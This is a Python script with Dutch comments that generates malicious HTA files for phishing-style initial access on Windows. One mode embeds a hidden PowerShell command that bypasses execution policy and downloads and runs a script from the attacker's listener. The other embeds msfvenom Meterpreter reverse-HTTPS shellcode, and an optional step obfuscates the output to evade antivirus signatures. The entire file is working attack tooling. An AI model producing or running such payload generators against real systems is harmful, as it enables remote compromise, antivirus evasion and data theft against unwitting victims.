#!/usr/bin/python3

# HTA Payload generator
# Twee modi: PowerShell download cradle of embedded msfvenom shellcode

from meuk.hacksec import *

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP")
parser.add_argument("lport", help="listener port", nargs="?", default="443")
parser.add_argument("payload", help="msfvenom payload type", nargs="?", default="windows/x64/meterpreter/reverse_https")
parser.add_argument("mode", help="cradle of embedded", nargs="?", default="cradle")
parser.add_argument("--obfuscate", action="store_true", help="HTA AV obfuscatie toepassen")
args = parser.parse_args()

print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating HTA payload ({bcolors.OKGREEN}{args.mode}{bcolors.OKBLUE}) for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")

template = lezen("meuk/template/hta_powershell.hta")

if args.mode == "cradle":
    # PowerShell download cradle
    command = f"powershell.exe -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{args.lhost}:{args.lport}/shell')\""
    hta = template.replace("[command]", command)
else:
    # Embedded msfvenom shellcode via PowerShell -enc
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Running msfvenom for payload {bcolors.OKGREEN}{args.payload}{bcolors.ENDC}")
    result = subprocess.run(
        ["msfvenom", "-p", args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}",
         "-f", "psh-cmd", "-o", "-"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )

    if result.returncode != 0:
        print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
        exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")

    psh_command = result.stdout.decode("utf-8", errors="replace").strip()
    hta = template.replace("[command]", psh_command)

if args.obfuscate:
    from obfuscate_av import obfuscate_text
    hta, hta_stats = obfuscate_text(hta, "hta")
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] HTA obfuscatie: {hta_stats['string']} signatures aangepast{bcolors.ENDC}")

schrijven("http/payloads/payload.hta", hta)
print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] HTA payload geschreven naar: http/payloads/payload.hta{bcolors.ENDC}")
